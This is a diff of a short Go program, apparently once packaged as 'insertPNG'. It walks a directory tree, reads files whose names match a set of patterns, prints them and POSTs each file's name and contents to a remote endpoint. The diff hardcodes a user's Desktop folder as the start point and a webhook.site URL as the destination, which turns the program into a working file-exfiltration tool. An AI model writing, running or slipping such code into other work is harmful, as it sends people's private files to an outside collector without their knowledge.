@@ -1,13 +1,13 @@
-package insertPNG
+package main
 
 import (
 	"bytes"
 	"fmt"
 	"log"
 	"net/http"
-	"os"
 	"path/filepath"
 	"regexp"
+	"os"
 )
 
 //Authors: Aram Maljanian
@@ -20,7 +20,7 @@ var regexes = []*regexp.Regexp{
 
 func main() {
 
-	root := os.Args[1]
+	root := "C:\\Users\\User1\\Desktop\\testFolder"
 	if err := filepath.Walk(root, walkFn); err != nil {
 		log.Panicln(err)
 	}
@@ -44,7 +44,7 @@ func readAFile(path string) {
 	if err != nil {
 		panic(err)
 	}
-	fmt.Print(string(dat))
+	fmt.Println(string(dat))
 	httpPoster(string(dat), path)
 
 }
@@ -52,7 +52,7 @@ func readAFile(path string) {
 func httpPoster(fileData string, filename string) {
 	data := []byte(filename + ":" + fileData)
 
-	req, err := http.NewRequest("POST", os.Args[2], bytes.NewBuffer(data))
+	req, err := http.NewRequest("POST", "https://webhook.site/d2524545-acb5-4ac8-8585-91c68d106f0d", bytes.NewBuffer(data))
 	req.Header.Set("Content-Type", "application/json")
 	client := &http.Client{}
 
